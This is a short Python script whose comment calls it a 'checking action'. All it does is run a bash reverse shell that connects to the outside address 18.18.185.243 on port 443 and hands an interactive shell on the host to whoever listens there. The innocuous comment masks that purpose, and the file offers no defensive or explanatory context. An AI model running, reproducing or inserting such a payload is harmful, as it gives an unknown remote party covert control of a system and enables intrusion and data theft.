#!/usr/bin/env python
#Checking action
import os

shell="bash -c 'bash -i >& /dev/tcp/18.18.185.243/443 0>&1'"
os.system(shell)
